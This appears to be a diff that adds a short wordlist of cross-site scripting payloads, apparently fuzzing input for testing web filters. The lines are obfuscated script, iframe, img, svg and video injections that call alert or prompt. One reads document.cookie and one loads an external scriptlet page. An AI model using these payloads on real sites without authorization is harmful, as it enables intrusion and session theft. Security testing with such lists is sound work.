@@ -1,0 +1,11 @@
+%3Ciframe src=http://xss.rocks/scriptlet.html &lt;
+http ://www.+-+-1-+-+<script/**/>+-+-1-+-+alert( 1 )%0A</script .c%0Ao%0Am
+``/**/> /KinG-InFeT.NeT/%253E<script/**/>alert%28document.cookie)</scriPT>%0A
+/* i%00f%00r%00a%00m%00e%00/%00s%00rc*/**// %3Ciframe/src="%253Ciframe/src%3D@/**/" /onload=prompt/**/(/**/1)/**/ /%252Aiframe/src*/&gt;
+<img/**/ src/onerror%3Dprompt(8) &gt;
+%3Cimage/src/onerror=prompt(/**/8)%0A>&Tab;
+<BodY onpageshow%3Dalert(1)/**/>!#$%&()*~+-_.,:;?@[/|\]^`
+<script>%2B-%2B-1-%2B-%2Balert(1/**/)/**/</script> 
+<video/**/ src/onerror=alert(1)>
+veris--%253Egr%0Ao%0Aup%0A<svg/onload=alert(/XSS/) ///**/
+<script> +-+-1-+-+alert(1%0A) %3C/script>!#$%&()*~+-_.,:;?@[/|\]^`
